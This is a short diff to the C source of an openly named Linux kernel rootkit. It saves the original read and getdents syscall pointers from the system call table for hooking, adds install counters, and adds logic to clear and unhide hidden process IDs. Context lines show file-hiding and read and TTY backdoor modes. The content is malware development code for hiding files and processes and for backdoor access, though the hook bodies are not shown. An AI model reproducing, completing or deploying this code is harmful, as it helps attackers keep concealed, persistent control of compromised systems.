@@ -17,6 +17,9 @@ extern rootkit_t rootkit;
 
 void **sys_calls;
 
+atomic_t read_install_count;
+atomic_t getdents_install_count;
+
 atomic_t read_count;
 atomic_t getdents_count;
 atomic_t getdents64_count;
@@ -42,13 +45,15 @@ retrieve_sys_call_table(void)
 void
 init_hooks(void)
 {
+    atomic_set(&read_install_count, 0);
+    atomic_set(&getdents_install_count, 0);
+
     atomic_set(&read_count, 0);
-    sys_read = (void *)sys_calls[__NR_read];
-
     atomic_set(&getdents_count, 0);
-    sys_getdents = (void *)sys_calls[__NR_getdents];
-
     atomic_set(&getdents64_count, 0);
+
+    sys_read = (void *)sys_calls[__NR_read];
+    sys_getdents = (void *)sys_calls[__NR_getdents];
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
 
     if (rootkit.hiding_files)
@@ -58,6 +63,11 @@ init_hooks(void)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
         backdoor_tty();
+
+    if (rootkit.hiding_pids) {
+        clear_hidden_pids();
+        unhide_pids();
+    }
 }
 
 void
